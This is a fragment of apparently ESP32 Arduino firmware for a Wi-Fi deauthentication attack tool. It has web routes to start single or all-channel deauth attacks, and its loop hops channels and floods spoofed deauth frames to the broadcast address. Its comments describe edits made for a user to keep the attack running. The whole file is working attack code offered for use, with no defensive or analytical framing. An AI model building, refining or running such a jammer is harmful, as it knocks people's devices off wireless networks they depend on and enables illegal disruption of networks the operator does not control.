// Function to start the web interface
void start_web_interface() {
  // Configure web server routes and handlers
  server.on("/", HTTP_GET, handle_root); // Handle GET requests for root
  server.on("/deauth", HTTP_POST, handle_deauth); // Handle POST requests for /deauth
  server.on("/deauth_all", HTTP_POST, handle_deauth_all); // Handle POST requests for /deauth_all
  server.on("/rescan", HTTP_POST, handle_rescan); // Handle POST requests for /rescan
  server.on("/stop", HTTP_POST, handle_stop); // Handle POST requests for /stop

  // Start the web server
  server.begin();
#ifdef SERIAL_DEBUG // Print status to serial if debug is enabled
  Serial.println("HTTP server started");
#endif
}

// Function to handle web server clients in the main loop
void web_interface_handle_client() {
  server.handleClient();
}


// Standard Arduino setup function - runs once on boot
void setup() {
#ifdef SERIAL_DEBUG
  // SERIAL_DEBUG requires definition (now included from definitions.h content)
  Serial.begin(115200); // Corrected baud rate back to 115200 based on user's screenshot
  DEBUG_PRINTLN("Serial started");
#endif

#ifdef LED
  // LED requires definition (now included from definitions.h content)
  pinMode(LED, OUTPUT);
#endif

  // Set up ESP32 as an Access Point for the web interface
  // AP_SSID and AP_PASS require definition (now included from definitions.h content)
  WiFi.mode(WIFI_MODE_AP);
  // Ensure AP is running for web interface access initially
  WiFi.softAP(AP_SSID, AP_PASS);
  DEBUG_PRINT("Access Point ");
  DEBUG_PRINT(AP_SSID);
  DEBUG_PRINTLN(" started");
  DEBUG_PRINT("IP address: ");
  DEBUG_PRINTLN(WiFi.softAPIP());


  // Start the web interface
  start_web_interface();

  // Initialize deauth_type to a non-attack state
  deauth_type = -1; // Or some other value indicating no attack is active

  // Note: start_deauth() is not called in this setup. You will need
  // to trigger it based on your application logic (e.g., via the web interface).
}

// Standard Arduino loop function - runs continuously
void loop() {
  // If the attack type is DEAUTH_TYPE_ALL, cycle through channels
  // DEAUTH_TYPE_ALL and CHANNEL_MAX require definition (now included from definitions.h content)
  if (deauth_type == DEAUTH_TYPE_ALL) {
    // Channel hopping logic
    if (curr_channel > CHANNEL_MAX) curr_channel = 1; // Wrap around channels
    DEBUG_PRINT("Hopping to channel: ");
    DEBUG_PRINTLN(curr_channel);
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE); // Set the Wi-Fi channel
    curr_channel++; // Move to the next channel
    delay(10); // Small delay before changing channel

    // NOTE: In DEAUTH_TYPE_ALL mode, the web server handleClient() is NOT called here.
    // This means the web interface becomes unresponsive while the channel hopping attack is active.
    // To regain access to the web interface, you must stop the attack (e.g., by pressing the physical reset button
    // on the ESP32, which restarts the device and runs setup again). The "Stop" button in the UI won't work while
    // the loop is stuck in this channel hopping branch. Consider adding a timer or counter to switch back
    // to handling clients periodically if you need the web UI to remain somewhat responsive.
  } else if (deauth_type == DEAUTH_TYPE_SINGLE) { // --- MODIFIED: Added loop logic for single target attack ---
    // Single target deauth (broadcast flood)
    // Send bursts of deauth frames to the broadcast address periodically
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        // WIFI_IF_AP interface is used in single mode where we spoof the target AP
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
    }
    DEBUG_PRINTF("Send %d Deauth-Frames to: FF:FF:FF:FF:FF:FF (SINGLE TARGET)\n", NUM_FRAMES_PER_DEAUTH);
    BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    // Wait for a short interval before sending the next burst
    delay(DEAUTH_ATTACK_INTERVAL_MS);

  } else {
    // If no attack is running, handle web client requests to keep the web interface responsive.
    web_interface_handle_client();
  }

  // Note: The deauth sniffing and sending happens automatically via the IRAM_ATTR sniffer callback
  // whenever the ESP32 receives a packet matching the promiscuous filter, *after*
  // promiscuous mode is enabled by start_deauth(). The loop() function's role depends
  // on the current 'deauth_type'.
}
